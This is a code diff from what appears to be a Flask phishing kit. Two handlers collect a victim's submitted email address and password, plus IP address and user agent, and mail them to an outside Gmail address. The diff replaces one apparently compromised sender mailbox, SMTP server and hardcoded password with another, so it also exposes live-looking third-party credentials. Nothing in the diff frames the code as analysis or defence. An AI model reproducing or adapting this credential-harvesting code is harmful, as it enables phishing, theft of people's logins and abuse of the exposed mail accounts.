@@ -145,10 +145,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "erler-zimmer@erler-zimmer-de.com"
-        sender_emaill = "eissa"
+        sender_email = "Baba@akerberg.fi"
+        sender_emaill = "Baba"
         receiver_email = "giridharavimech@gmail.com"
-        password = "%m9F~EhYCh!*"
+        password = "Bams1705!"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "Round Power !"
@@ -164,7 +164,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.erler-zimmer-de.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.akerberg.fi", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -183,10 +183,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "erler-zimmer@erler-zimmer-de.com"
-        sender_emaill = "erler-zimmer"
+        sender_email = "Baba@akerberg.fi"
+        sender_emaill = "Baba"
         receiver_email = "giridharavimech@gmail.com"
-        password = "%m9F~EhYCh!*"
+        password = "Bams1705!"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "Round Power !! "
@@ -202,7 +202,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.erler-zimmer-de.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.akerberg.fi", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
